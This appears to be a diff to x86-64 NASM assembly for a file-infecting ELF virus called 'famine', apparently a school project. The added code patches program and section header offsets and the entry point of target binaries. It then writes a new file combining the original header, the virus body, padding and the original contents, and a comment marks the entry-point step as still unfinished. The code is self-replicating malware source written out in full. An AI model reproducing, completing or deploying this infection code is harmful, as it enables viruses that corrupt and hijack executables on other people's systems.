@@ -2,7 +2,9 @@
 [BITS 64]
 default rel
 
+%ifdef DEBUG
 extern xprintf
+%endif
 
 section .text
     global _famine
@@ -134,20 +136,19 @@ elf_header:
 %ifdef DEBUG
     mov rsi, [rbp - 16]
     movzx rsi, word [rsi + Elf64_Ehdr.e_type] 
-
-    ; movzx rax, word [rsi + Elf64_Ehdr.e_type] 
     dbg [rel(hook.e_type)], rsi
     dbg [rel(hook.v_size)], FAMINE_SIZE
+    mov rsi, [rbp - 16]
 %endif
 
 ; rsi = e_hdr
 elf_phdr:
     mov rdx, rsi
-    add rdx, [rdx  + Elf64_Ehdr.e_phoff]
+    add rdx, [rdx + Elf64_Ehdr.e_phoff]
     ;rdx = phdr
     PAGE_ALIGN FAMINE_SIZE
     add [rdx + phdr64.p_offset], rcx                          ; phdr[0]
-    add [rdx + 0x38 + phdr64.p_offset], rcx                   ; phdr[1]
+    add [rdx + phdr64.p_offset + 0x38], rcx                   ; phdr[1]
     push rcx                                                  ; FAMINE_SIZE
     ; this can maybe be optimized by jumping directly to phdr[2] after.
 %ifdef DEBUG
@@ -155,7 +156,7 @@ elf_phdr:
     dbg [rel(hook.number)], [rdx + phdr64.p_offset]
     pop rdx
     push rdx
-    dbg [rel(hook.number)], [rdx + 0x38 + phdr64.p_offset]
+    dbg [rel(hook.number)], [rdx + phdr64.p_offset + 0x38]
     pop rdx
 %endif
 
@@ -163,6 +164,7 @@ elf_phdr:
 patch_segtext:
     pop rsi                                                 ; PAGE_ALIGN_UP(FAMINE_SIZE)
     mov rax, [rbp - 16]
+    xor rcx, rcx
     mov cx, word [rax + Elf64_Ehdr.e_phnum]                 ; n phdr
     xor rax, rax
     .loop:
@@ -172,7 +174,7 @@ patch_segtext:
     .found:                                                 ; if TEXT_FOUND already
         cmp al, 1
         jne .compare
-        add [rdx + phdr64.p_offset], qword rsi
+        add [rdx + phdr64.p_offset], rsi
     .compare:
         cmp dword [rdx + phdr64.p_type], PT_LOAD
         jne .keep
@@ -193,23 +195,24 @@ patch_segtext:
 patch_hdr:
     test al, al
     je clear                                               ; NEED TO JUMP TO MUMMAP.
-    add qword [rdi + Elf64_Ehdr.e_entry], 64
+    add qword [rdi + Elf64_Ehdr.e_entry], 0x40               ; new entry  + sizeof(elf_hdr)
 
 patch_shdr:
-    mov rax, [rbp - 16]
-    add rax, [rax + Elf64_Ehdr.e_shoff]
-    xor rcx, rcx
-    mov cx, word [rax + Elf64_Ehdr.e_shnum]
+    mov rax, [rbp - 16]                                    ;EHDR
+    xor rcx, rcx                                           ;0 not needed probably
+    mov cx, word [rax + Elf64_Ehdr.e_shnum]                ;n sections
+    add rax, [rax + Elf64_Ehdr.e_shoff]                    ;sections[0]
     .loop:
         cmp cx, 0
-        je mimic
+        je .ehdr
         sub cx, 1
-        mov [rax + shdr64.sh_offset], rsi
+        add [rax + shdr64.sh_offset], rsi                  ; ADD PAGE_ALIGN_UP(FAMINE_SIZE)
         add rax, 0x40
         jmp .loop
-    mov rax, [rbp - 16]
-    add [rax + Elf64_Ehdr.e_shoff], rsi
-    add [rax + Elf64_Ehdr.e_phoff], rsi
+    .ehdr:
+        mov rax, [rbp - 16]
+        add [rax + Elf64_Ehdr.e_shoff], rsi
+        add [rax + Elf64_Ehdr.e_phoff], rsi
 
 mimic:
     lea rdi, [rel(hook.TMP)]
@@ -219,8 +222,47 @@ mimic:
     syscall
     cmp rax, 0
     jl clear
+    mov r8, rax
+    mov rdi, r8
+    mov rsi, [rbp - 16]
+    mov rdx, 64                                                    ; header
+    mov rax, SYS_WRITE
+    syscall
 
+    mov rdi, r8
+    lea rsi, [rel _famine]
+    mov rdx, FAMINE_SIZE
+    mov rax, SYS_WRITE
+    syscall
+
+    PAGE_ALIGN FAMINE_SIZE
+    sub rcx, FAMINE_SIZE
+    mov r9, rcx
+    .loop:
+        cmp r9, 0
+        je .keep
+        mov rdi, r8
+        lea rsi, [rel(hook.null)]
+        mov rdx, 1
+        mov rax, SYS_WRITE
+        syscall
+        sub r9, 1
+        jmp .loop
+    
+    .keep:
+        mov rdi, r8
+        mov rax, [rbp - 16]
+        add rax, 0x40
+        mov rsi, rax
+        mov rdx, [rsp + FILE_SIZE + DIRENT + 48]
+        sub rdx, 0x40
+        mov rax, SYS_WRITE
+        syscall
+    ;;;;;; NEED TO WRITE ENTRYPOINT SOMEWHAT.
 clear:
+    mov rdi, r8
+    mov rax, SYS_CLOSE
+    syscall
     ; MUNMAP
 next_file:
     ; maybe RBX not valid anymore aswell.
@@ -252,6 +294,8 @@ hook:
         db FOLDER_2, 0
     .TMP:
         db TMP, 0
+    .null:
+        db 0
 %ifdef DEBUG
     .newline:
         db 0xa, 0
